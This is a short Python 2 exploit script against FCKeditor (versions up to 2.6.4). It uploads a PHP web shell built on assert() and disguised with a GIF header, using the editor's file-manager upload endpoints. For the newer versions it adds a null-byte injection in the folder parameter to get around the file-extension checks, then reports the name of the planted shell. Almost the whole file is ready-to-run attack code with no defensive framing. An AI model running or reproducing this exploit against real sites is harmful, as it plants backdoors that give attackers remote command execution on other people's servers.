#coding=utf-8

'''
wangeradd1@gihub

'''

import requests
import warnings
import random
import sys

warnings.filterwarnings("ignore")

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}

shelltxt = "GIF89a <?php @assert($_REQUEST['fck']); ?>"

def randstr():
    return "".join(random.sample("AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789",10))
    

'''fckeditor version <= 2.4.3'''

def fck_243(baseurl):
    backends = "/editor/filemanager/upload/php/upload.php?Type=Media"
    
    file_name = randstr() + ".php"
    files = {"NewFile":(file_name,shelltxt,"image/jpeg"),}
    
    try:
        res = requests.post(baseurl+backends,files = files,headers = headers)
        if res.status_code == 200:
            print res.content
            print "-------------------------------------------------------------\n"
            print "Maybe vulnerable,try the shellname '" +file_name + "'!\n"
            print "-------------------------------------------------------------\n"
        else:
            print "Maybe not vulnerable with FCK243!"
    except Exception,e:
        print e
'''2.4.3 <= fckeditor version <= 2.6.4'''
           
def fck_264(baseurl):
    file_name = randstr() + ".php"
    
    backends = "/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=" + file_name + "%00.jpg"
    
    files = {"NewFile":("fck.jpg",shelltxt,"image/jpeg"),}
    
    try:
        res = requests.post(baseurl+backends,files = files,headers = headers)
        if res.status_code == 200:
            print res.content
            print "---------------------------------------------------------------\n"
            print "Maybe vulnerable,try the shellname '" +file_name + "'!\n"
            print "---------------------------------------------------------------\n"
        else:
            print "Maybe not vulnerable with FCK264!"
    except Exception,e:
        print e

if len(sys.argv) == 2:
    baseuri = sys.argv[1]

    fck_243(baseuri)

    fck_264(baseuri)
else:
    print '\nUSGE: python fckeditor.py "http://127.0.0.1/fckeditor"\n'